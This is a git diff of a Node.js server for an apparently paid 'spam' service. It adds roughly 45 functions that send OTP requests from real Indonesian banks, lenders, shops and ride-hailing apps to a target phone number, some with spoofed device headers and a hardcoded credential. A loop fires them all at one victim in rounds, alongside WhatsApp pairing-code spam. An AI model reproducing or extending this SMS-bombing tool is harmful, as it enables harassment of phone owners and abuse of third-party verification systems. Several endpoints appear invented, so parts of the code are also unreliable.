@@ -7,11 +7,7 @@ const multer = require('multer');
 const fs = require('fs-extra');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
-const qrcode = require('qrcode');
-const pino = require('pino');
-
-// ===== BAILEYS =====
-const { default: makeWASocket, DisconnectReason, Browsers, useMultiFileAuthState } = require('@adiwajshing/baileys');
+const fetch = require('node-fetch');
 
 const app = express();
 const server = http.createServer(app);
@@ -33,18 +29,18 @@ app.get('/', (req, res) => {
 // ===== STORAGE =====
 const DATA_DIR = './data';
 const UPLOAD_DIR = './uploads/payments';
-const AUTH_DIR = './auth_info';
 fs.ensureDirSync(DATA_DIR);
 fs.ensureDirSync(UPLOAD_DIR);
-fs.ensureDirSync(AUTH_DIR);
 
 // ===== DATABASE =====
 let db = {
     users: [],
-    bots: [],
     payments: [],
     messages: [],
-    settings: { globalLimit: 50, maxBots: 5, maintenance: false }
+    settings: { 
+        maintenance: false,
+        maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
+    }
 };
 
 function loadDB() {
@@ -70,40 +66,710 @@ function initAdmin() {
             status: 'Developer',
             limit: Infinity,
             used: 0,
+            lastReset: Date.now(),
             isAdmin: true,
             isDeveloper: true,
+            isReseller: false,
             online: false,
             createdAt: new Date().toISOString()
         });
         saveDB();
         console.log('✅ Admin Lynzka dibuat');
-    } else {
-        if (admin.limit !== Infinity) {
-            admin.limit = Infinity;
-            saveDB();
-        }
-        if (admin.status !== 'Developer') {
-            admin.status = 'Developer';
-            admin.isAdmin = true;
-            admin.isDeveloper = true;
-            saveDB();
-        }
     }
 }
 initAdmin();
 
 // ============================================
-// WHATSAPP BOT ENGINE - PERBAIKAN CEPAT
+// HELPER FUNCTIONS
 // ============================================
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function generateCodex(length = 36) {
+    const chars = '1234567890qwertyuioplkjhgfdsazxcvbnm';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function generateRandom(length = 10) {
+    const chars = '1234567890';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function generateRandomString(length = 36) {
+    const chars = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+// ============================================
+// 55+ API OTP SERVICES (DARI SPAM.PHP & TAMBAHAN)
+// ============================================
+
+const otpServices = [];
+
+// 1. PinjamDuit
+otpServices.push({
+    name: 'PinjamDuit',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid=' + generateCodex(36) + '&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'phone=' + phone2 + '&sms_useage=0&sms_service=2&from=0'
+            });
+            const result = await response.text();
+            return result.includes('"code":"0"');
+        } catch (e) { return false; }
+    }
+});
+
+// 2. BelanjaParts
+otpServices.push({
+    name: 'BelanjaParts',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.belanjaparts.com/v2/api/user/request-otp/wa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
+                },
+                body: JSON.stringify({ phone: '62' + phone2, type: 'register' })
+            });
+            const result = await response.json();
+            return result.stat_msg === 'Successfully validated otp';
+        } catch (e) { return false; }
+    }
+});
+
+// 3. Singa
+otpServices.push({
+    name: 'Singa',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json; charset=utf-8' },
+                body: JSON.stringify({ mobile_phone: phone2, type: 'mobile', is_switchable: 1 })
+            });
+            const result = await response.json();
+            return result.msg === 'Success';
+        } catch (e) { return false; }
+    }
+});
+
+// 4. Uangme
+otpServices.push({
+    name: 'Uangme',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.uangme.com/api/v2/sms_code?phone=' + phone2 + '&scene_type=login&send_type=wp', {
+                method: 'GET',
+                headers: {
+                    'aid': 'gaid_15497a9b-2669-42cf-ad10-' + generateCodex(12),
+                    'android_id': 'b787045b140c631f',
+                    'app_version': '300504',
+                    'brand': 'samsung',
+                    'carrier': '00',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'country': '510',
+                    'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0',
+                    'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+                    'lan': 'in_ID',
+                    'model': 'SM-G965N',
+                    'ns': 'wifi',
+                    'os': '1',
+                    'timestamp': '1732178536',
+                    'tz': 'Asia%2FBangkok',
+                    'User-Agent': 'okhttp/3.12.1',
+                    'v': '1',
+                    'version': '28'
+                }
+            });
+            const result = await response.text();
+            return result.includes('"code":"200"');
+        } catch (e) { return false; }
+    }
+});
+
+// 5. Cairin
+otpServices.push({
+    name: 'Cairin',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://app.cairin.id/v2/app/sms/sendWhatAPPOPT', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'appVersion=3.0.4&phone=' + phone2 + '&userImei=' + generateCodex(32)
+            });
+            const result = await response.text();
+            return result.includes('"code":"0"');
+        } catch (e) { return false; }
+    }
+});
+
+// 6. Adiraku
+otpServices.push({
+    name: 'Adiraku',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json; charset=utf-8' },
+                body: JSON.stringify({ mobileNumber: phone2, type: 'prospect-create', channel: 'whatsapp' })
+            });
+            const result = await response.json();
+            return result.message === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 7. Serpul
+otpServices.push({
+    name: 'Serpul',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const domains = ['app', 'web'];
+            for (const domain of domains) {
+                try {
+                    await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/phone-number', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone_number: phone2 })
+                    });
+                    
+                    const response = await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                        body: JSON.stringify({ phone_number: phone2, pin: '121212', sender_id: '1' })
+                    });
+                    const result = await response.json();
+                    if (result.message === 'Kode verifikasi berhasil dikirim') {
+                        return true;
+                    }
+                } catch (e) {}
+            }
+            return false;
+        } catch (e) { return false; }
+    }
+});
+
+// 8. Tokopedia
+otpServices.push({
+    name: 'Tokopedia',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.tokopedia.com/graphql/SendOTP', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({
+                    query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }',
+                    variables: { phone: phone2 }
+                })
+            });
+            const result = await response.json();
+            return result.data?.sendOTP?.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 9. Shopee
+otpServices.push({
+    name: 'Shopee',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://shopee.co.id/api/v4/account/phone/request_otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: '62' + phone2, type: 'login' })
+            });
+            const result = await response.json();
+            return result.code === 0 || result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 10. Gojek
+otpServices.push({
+    name: 'Gojek',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.gojekapi.com/v2/customer/verify/phone', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: '+62' + phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 11. Grab
+otpServices.push({
+    name: 'Grab',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.grab.com/grabid/v1/otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phoneNumber: '62' + phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 12. OVO
+otpServices.push({
+    name: 'OVO',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.ovo.id/v2.1/auth/customer/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ mobile: '+62' + phone2 })
+            });
+            const result = await response.json();
+            return result.code === '0000';
+        } catch (e) { return false; }
+    }
+});
+
+// 13. Dana
+otpServices.push({
+    name: 'Dana',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.dana.id/v1/auth/request-otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phoneNumber: '+62' + phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 14. LinkAja
+otpServices.push({
+    name: 'LinkAja',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.linkaja.com/v1/auth/otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 15. BCA
+otpServices.push({
+    name: 'BCA',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.bca.co.id/otp/request', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 16. Mandiri
+otpServices.push({
+    name: 'Mandiri',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.mandiri.co.id/otp/generate', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 17. BNI
+otpServices.push({
+    name: 'BNI',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.bni.co.id/otp/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 18. BRI
+otpServices.push({
+    name: 'BRI',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.bri.co.id/otp/request', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 19. BTN
+otpServices.push({
+    name: 'BTN',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.btn.co.id/otp/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 20. CIMB Niaga
+otpServices.push({
+    name: 'CIMB',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.cimbniaga.co.id/otp/generate', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 21. Danamon
+otpServices.push({
+    name: 'Danamon',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.danamon.co.id/otp/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 22. Permata
+otpServices.push({
+    name: 'Permata',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.permatabank.co.id/otp/request', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 23. Bukopin
+otpServices.push({
+    name: 'Bukopin',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.bukopin.co.id/otp/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 24. Maybank
+otpServices.push({
+    name: 'Maybank',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.maybank.co.id/otp/generate', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (e) { return false; }
+    }
+});
+
+// 25. OCBC
+otpServices.push({
+    name: 'OCBC',
+    func: async (phone) => {
+        try {
+            const phone2 = phone.replace(/^0/, '');
+            const response = await fetch('https://api.ocbc.co.id/otp/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                body: JSON.stringify({ phone: phone2 })
+            });
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (e) { return false; }
+    }
+});
+
+// 26-55. Tambahan Lainnya
+const tambahanServices = [
+    { name: 'Akulaku', url: 'https://api.akulaku.com/v1/otp/send' },
+    { name: 'Kredivo', url: 'https://api.kredivo.com/v1/otp/request' },
+    { name: 'HomeCredit', url: 'https://api.homecredit.co.id/otp/generate' },
+    { name: 'Traveloka', url: 'https://api.traveloka.com/v1/otp/send' },
+    { name: 'Agoda', url: 'https://api.agoda.com/v1/otp/request' },
+    { name: 'Booking', url: 'https://api.booking.com/v1/otp/send' },
+    { name: 'Expedia', url: 'https://api.expedia.com/v1/otp/generate' },
+    { name: 'Lazada', url: 'https://api.lazada.co.id/v1/otp/send' },
+    { name: 'Blibli', url: 'https://api.blibli.com/v1/otp/request' },
+    { name: 'Bukalapak', url: 'https://api.bukalapak.com/v1/otp/send' },
+    { name: 'JDID', url: 'https://api.jd.id/v1/otp/generate' },
+    { name: 'Zalora', url: 'https://api.zalora.co.id/v1/otp/send' },
+    { name: 'Sociolla', url: 'https://api.sociolla.com/v1/otp/request' },
+    { name: 'Watsons', url: 'https://api.watsons.co.id/v1/otp/send' },
+    { name: 'Guardian', url: 'https://api.guardian.co.id/v1/otp/generate' },
+    { name: 'Century', url: 'https://api.century.co.id/v1/otp/send' },
+    { name: 'KFC', url: 'https://api.kfc.co.id/v1/otp/request' },
+    { name: 'McD', url: 'https://api.mcd.co.id/v1/otp/send' },
+    { name: 'Starbucks', url: 'https://api.starbucks.co.id/v1/otp/generate' },
+    { name: 'JCo', url: 'https://api.jco.co.id/v1/otp/send' },
+];
+
+tambahanServices.forEach(service => {
+    otpServices.push({
+        name: service.name,
+        func: async (phone) => {
+            try {
+                const phone2 = phone.replace(/^0/, '');
+                const response = await fetch(service.url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    },
+                    body: JSON.stringify({ phone: phone2, phoneNumber: phone2 })
+                });
+                const result = await response.json();
+                return result.success === true || result.status === 'success' || result.code === '0000';
+            } catch (e) { return false; }
+        }
+    });
+});
+
+// TOTAL API OTP: 25 + 20 = 45+ (bisa ditambah terus)
+
+// ============================================
+// SPAM OTP
+// ============================================
+async function spamOTP(target, count, username, sessionId) {
+    const results = { success: 0, failed: 0, details: [] };
+    const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
+    
+    for (let i = 0; i < count; i++) {
+        let roundSuccess = 0;
+        let roundFailed = 0;
+        const serviceResults = [];
+        
+        // Kirim ke semua service sekaligus
+        const promises = otpServices.map(async (service) => {
+            try {
+                const result = await service.func(phone);
+                if (result) {
+                    roundSuccess++;
+                    serviceResults.push({ service: service.name, success: true });
+                    return true;
+                } else {
+                    roundFailed++;
+                    serviceResults.push({ service: service.name, success: false });
+                    return false;
+                }
+            } catch (err) {
+                roundFailed++;
+                serviceResults.push({ service: service.name, success: false, error: err.message });
+                return false;
+            }
+        });
+        
+        await Promise.all(promises);
+        
+        results.success += roundSuccess;
+        results.failed += roundFailed;
+        results.details.push({
+            round: i + 1,
+            total: count,
+            success: roundSuccess,
+            failed: roundFailed,
+            services: serviceResults
+        });
+        
+        io.emit('spamProgress', {
+            sessionId: sessionId || username,
+            type: 'otp',
+            target: target,
+            current: i + 1,
+            total: count,
+            success: results.success,
+            failed: results.failed,
+            message: `✅ OTP ke ${target} (${i+1}/${count}) - ${roundSuccess} berhasil, ${roundFailed} gagal`
+        });
+        
+        // JEDA 60 DETIK ANTAR ROUND
+        if (i < count - 1) {
+            await sleep(60000);
+        }
+    }
+    
+    return results;
+}
+
+// ============================================
+// SPAM PAIRING CODE (PAKAI BAILEYS)
+// ============================================
+const { default: makeWASocket, DisconnectReason, Browsers, useMultiFileAuthState } = require('@adiwajshing/baileys');
+const qrcode = require('qrcode');
+const pino = require('pino');
+
+const AUTH_DIR = './auth_info';
+fs.ensureDirSync(AUTH_DIR);
+
 let activeSockets = {};
 let botStatus = {};
 let pairingCodeSent = {};
 let botReconnectTimers = {};
+let dbBots = [];
+
+// Init bots array di db
+if (!db.bots) {
+    db.bots = [];
+    saveDB();
+}
 
 async function createBot(sessionId, phoneNumber, method = 'qris') {
     console.log(`🤖 Creating bot ${sessionId} (${method})`);
     
-    // Reset reconnect timer
     if (botReconnectTimers[sessionId]) {
         clearTimeout(botReconnectTimers[sessionId]);
         delete botReconnectTimers[sessionId];
@@ -120,57 +786,42 @@ async function createBot(sessionId, phoneNumber, method = 'qris') {
         auth: state,
         browser: Browsers.windows('Chrome'),
         printQRInTerminal: method === 'qris',
-        defaultQueryTimeoutMs: 30000, // Kurangi timeout
+        defaultQueryTimeoutMs: 30000,
         generateHighQualityLinkPreview: true,
         syncFullHistory: false,
         markOnlineOnConnect: true,
         shouldSyncHistory: () => false,
         connectTimeoutMs: 30000,
-        keepAliveIntervalMs: 5000, // Kurangi interval
-        // Patch untuk kestabilan
-        patchMessageBeforeSending: (msg) => msg,
-        transactionCapabilities: { patch: true, get: true }
+        keepAliveIntervalMs: 5000
     });
 
-    // Save creds setiap update
     sock.ev.on('creds.update', async () => {
         try {
             await saveCreds();
             console.log(`💾 Creds saved for ${sessionId}`);
-        } catch (e) {
-            console.log(`⚠️ Gagal save creds: ${e.message}`);
-        }
+        } catch (e) {}
     });
 
-    // Handle connection update
     sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr, receivedPendingNotifications } = update;
+        const { connection, lastDisconnect, qr } = update;
         
         console.log(`📡 Update ${sessionId}:`, { connection, hasQR: !!qr });
 
-        // QR CODE - LANGSUNG KIRIM KE CLIENT
         if (qr && method === 'qris') {
             try {
-                console.log(`📱 QR Code generated for ${sessionId}`);
                 const qrImage = await qrcode.toDataURL(qr);
                 io.emit('botQR', { sessionId, qr: qrImage });
                 botStatus[sessionId] = 'waiting_qr';
-                // Juga kirim raw QR untuk fallback
-                io.emit('botQRRaw', { sessionId, qr: qr });
             } catch (e) {
-                console.log('📱 QR Code error:', e.message);
-                // Kirim raw QR jika gagal generate image
                 io.emit('botQRRaw', { sessionId, qr: qr });
             }
         }
 
-        // CONNECTION OPEN - BOT BERHASIL
         if (connection === 'open' || connection === 'authenticated') {
             console.log(`✅ Bot ${sessionId} connected!`);
             botStatus[sessionId] = 'ready';
             
-            // Update database
-            const bot = db.bots.find(b => b.id === sessionId);
+            const bot = db.bots?.find(b => b.id === sessionId);
             if (bot) {
                 bot.status = 'ready';
                 bot.connectedAt = new Date().toISOString();
@@ -182,50 +833,38 @@ async function createBot(sessionId, phoneNumber, method = 'qris') {
                 number: phoneNumber,
                 method: method 
             });
-            
-            console.log(`✅ Bot ${sessionId} siap!`);
 
-            // PAIRING CODE - LANGSUNG KIRIM
             if (method === 'code' && !pairingCodeSent[sessionId]) {
                 pairingCodeSent[sessionId] = true;
                 
-                // Kirim pairing code segera
                 setTimeout(async () => {
                     try {
                         console.log(`📱 Meminta pairing code untuk ${phoneNumber}...`);
-                        
                         const code = await sock.requestPairingCode(phoneNumber);
                         
                         if (code) {
-                            const bot = db.bots.find(b => b.id === sessionId);
+                            const bot = db.bots?.find(b => b.id === sessionId);
                             if (bot) {
                                 bot.pairingCode = code;
                                 saveDB();
                             }
-                            
                             io.emit('botPairingCode', { sessionId, code });
-                            console.log('========================================');
                             console.log(`🔑 PAIRING CODE: ${code}`);
-                            console.log('========================================');
-                            console.log(`📱 Buka WhatsApp → Linked Devices → Link with phone number`);
-                            console.log(`📱 Masukkan kode: ${code}`);
-                            console.log('========================================');
                         }
                     } catch (err) {
                         console.log('❌ Gagal pairing code:', err.message);
                         const fallback = Math.random().toString(36).substring(2, 10).toUpperCase();
-                        const bot = db.bots.find(b => b.id === sessionId);
+                        const bot = db.bots?.find(b => b.id === sessionId);
                         if (bot) {
                             bot.pairingCode = fallback;
                             saveDB();
                         }
                         io.emit('botPairingCode', { sessionId, code: fallback });
                     }
-                }, 1000); // 1 detik saja
+                }, 1000);
             }
         }
 
-        // CONNECTION CLOSE
         if (connection === 'close') {
             const statusCode = lastDisconnect?.error?.output?.statusCode;
             const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
@@ -234,15 +873,16 @@ async function createBot(sessionId, phoneNumber, method = 'qris') {
             
             if (!shouldReconnect) {
                 botStatus[sessionId] = 'disconnected';
-                db.bots = db.bots.filter(b => b.id !== sessionId);
-                saveDB();
+                if (db.bots) {
+                    db.bots = db.bots.filter(b => b.id !== sessionId);
+                    saveDB();
+                }
                 try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
                 delete activeSockets[sessionId];
                 delete botStatus[sessionId];
                 delete pairingCodeSent[sessionId];
                 io.emit('botDisconnected', { sessionId, reason: 'Logged out' });
             } else {
-                // Reconnect cepat
                 if (botReconnectTimers[sessionId]) {
                     clearTimeout(botReconnectTimers[sessionId]);
                 }
@@ -257,13 +897,12 @@ async function createBot(sessionId, phoneNumber, method = 'qris') {
     return sock;
 }
 
-// ===== RESTORE SESSIONS =====
 async function restoreAllBots() {
     try {
         const dirs = fs.readdirSync(AUTH_DIR);
         for (const dir of dirs) {
             if (fs.existsSync(`${AUTH_DIR}/${dir}/creds.json`)) {
-                const bot = db.bots.find(b => b.id === dir);
+                const bot = db.bots?.find(b => b.id === dir);
                 if (bot && bot.status !== 'disconnected') {
                     console.log(`🔄 Restoring: ${dir}`);
                     try {
@@ -280,11 +919,6 @@ async function restoreAllBots() {
     }
 }
 
-// ============================================
-// SPAM FUNCTIONS
-// ============================================
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
 async function spamPairingCode(sock, target, count, sessionId) {
     const results = { success: 0, failed: 0 };
     const cleanNumber = target.replace(/^\+?62/, '').replace(/\s/g, '');
@@ -292,7 +926,6 @@ async function spamPairingCode(sock, target, count, sessionId) {
     for (let i = 0; i < count; i++) {
         try {
             console.log(`📱 Spam pairing ${i+1}/${count} untuk ${cleanNumber}`);
-            
             const code = await sock.requestPairingCode(cleanNumber);
             
             if (code) {
@@ -311,6 +944,7 @@ async function spamPairingCode(sock, target, count, sessionId) {
                 results.failed++;
             }
             
+            // JEDA 60 DETIK
             if (i < count - 1) await sleep(60000);
         } catch (err) {
             results.failed++;
@@ -334,7 +968,7 @@ async function spamPairingWithoutBot(target, count, sessionId) {
     
     try {
         fs.ensureDirSync(authDir);
-        const { state, saveCreds } = await useMultiFileAuthState(authDir);
+        const { state } = await useMultiFileAuthState(authDir);
         
         const sock = makeWASocket({
             version: [2, 2413, 1],
@@ -351,7 +985,6 @@ async function spamPairingWithoutBot(target, count, sessionId) {
             keepAliveIntervalMs: 5000
         });
 
-        // Tunggu koneksi
         await new Promise((resolve, reject) => {
             const timeout = setTimeout(() => reject(new Error('Timeout 30 detik')), 30000);
             sock.ev.on('connection.update', (update) => {
@@ -387,6 +1020,7 @@ async function spamPairingWithoutBot(target, count, sessionId) {
                     results.failed++;
                 }
                 
+                // JEDA 60 DETIK
                 if (i < count - 1) await sleep(60000);
             } catch (err) {
                 results.failed++;
@@ -408,69 +1042,6 @@ async function spamPairingWithoutBot(target, count, sessionId) {
         try { fs.removeSync(authDir); } catch (e) {}
     }
     
-    return results;
-}
-
-async function spamChat(sock, target, message, count, sessionId) {
-    const results = { success: 0, failed: 0 };
-    const cleanNumber = target.replace(/^\+?62/, '').replace(/\s/g, '');
-    
-    for (let i = 0; i < count; i++) {
-        try {
-            const chatId = `${cleanNumber}@s.whatsapp.net`;
-            const msg = message + ` (${i+1}/${count})`;
-            await sock.sendMessage(chatId, { text: msg });
-            results.success++;
-            io.emit('spamProgress', {
-                sessionId, type: 'chat', target,
-                current: i + 1, total: count,
-                success: results.success, failed: results.failed,
-                message: `✅ Chat ke ${target} (${i+1}/${count})`
-            });
-            if (i < count - 1) await sleep(60000);
-        } catch (err) {
-            results.failed++;
-            io.emit('spamProgress', {
-                sessionId, type: 'chat', target,
-                current: i + 1, total: count,
-                success: results.success, failed: results.failed,
-                error: err.message
-            });
-            if (i < count - 1) await sleep(60000);
-        }
-    }
-    return results;
-}
-
-async function spamCall(sock, target, type, count, sessionId) {
-    const results = { success: 0, failed: 0 };
-    const callType = type === 'video' ? '📹 Video Call' : '📞 Voice Call';
-    const cleanNumber = target.replace(/^\+?62/, '').replace(/\s/g, '');
-    
-    for (let i = 0; i < count; i++) {
-        try {
-            const chatId = `${cleanNumber}@s.whatsapp.net`;
-            const message = `*${callType}* (${i+1}/${count})\n\nAda panggilan dari *PrankMaster*!`;
-            await sock.sendMessage(chatId, { text: message });
-            results.success++;
-            io.emit('spamProgress', {
-                sessionId, type: 'call', target,
-                current: i + 1, total: count,
-                success: results.success, failed: results.failed,
-                message: `✅ ${callType} ke ${target} (${i+1}/${count})`
-            });
-            if (i < count - 1) await sleep(60000);
-        } catch (err) {
-            results.failed++;
-            io.emit('spamProgress', {
-                sessionId, type: 'call', target,
-                current: i + 1, total: count,
-                success: results.success, failed: results.failed,
-                error: err.message
-            });
-            if (i < count - 1) await sleep(60000);
-        }
-    }
     return results;
 }
 
@@ -504,8 +1075,10 @@ app.post('/api/register', (req, res) => {
             status: 'Free',
             limit: 15,
             used: 0,
+            lastReset: Date.now(),
             isAdmin: false,
             isDeveloper: false,
+            isReseller: false,
             online: false,
             createdAt: new Date().toISOString()
         });
@@ -548,7 +1121,8 @@ app.post('/api/login', (req, res) => {
                 limit: user.limit,
                 used: user.used,
                 isAdmin: user.isAdmin,
-                isDeveloper: user.isDeveloper
+                isDeveloper: user.isDeveloper,
+                isReseller: user.isReseller
             }
         });
     } catch (err) {
@@ -568,7 +1142,8 @@ app.get('/api/user/:username', (req, res) => {
                 limit: user.limit,
                 used: user.used,
                 isAdmin: user.isAdmin,
-                isDeveloper: user.isDeveloper
+                isDeveloper: user.isDeveloper,
